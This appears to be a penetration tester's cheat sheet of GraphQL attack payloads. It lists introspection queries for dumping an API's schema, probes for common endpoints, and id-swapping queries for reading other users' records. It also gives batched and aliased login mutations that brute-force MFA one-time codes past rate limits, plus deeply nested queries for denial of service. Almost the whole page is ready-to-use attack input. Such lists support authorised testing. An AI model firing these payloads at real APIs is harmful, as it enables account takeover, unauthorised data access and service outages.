---
title: "Payloads: GraphQL"
type: payloads
tags: [payloads, graphql, api, web]
sources: []
date_created: 2026-06-05
date_updated: 2026-06-05
---

# Payloads: GraphQL

Enumerate schema, then abuse. See [[api-security]].

## Introspection (full schema)
```graphql
{__schema{types{name fields{name args{name type{name}}}}}}
{__schema{queryType{name} mutationType{name} types{name kind}}}
```
If disabled: field-suggestion brute (error messages leak names), or use clairvoyance.

## Recon probes
```
{__typename}
query={__schema{types{name}}}        # also try GET ?query=
POST /graphql {"query":"..."}        # try /graphql /api/graphql /v1/graphql /graphiql
```

## Abuse
```
# IDOR / BOLA - swap object ids in queries
{ user(id:"<other>"){ email role } }
# Batching (bypass rate-limit / brute MFA)
[{"query":"mutation{login(otp:\"0000\")}"},{"query":"mutation{login(otp:\"0001\")}"}, ...]
# Alias overloading (amplify / brute in one request)
{ a:login(otp:"0000"){ok} b:login(otp:"0001"){ok} ... }
# Nested DoS
{ a{ b{ a{ b{ ... }}}} }
# Mutation enum -> find hidden privileged ops
```

## Auth issues
```
introspection in prod · queries without auth · mutation accessible pre-auth · JWT in WS connection_init
```
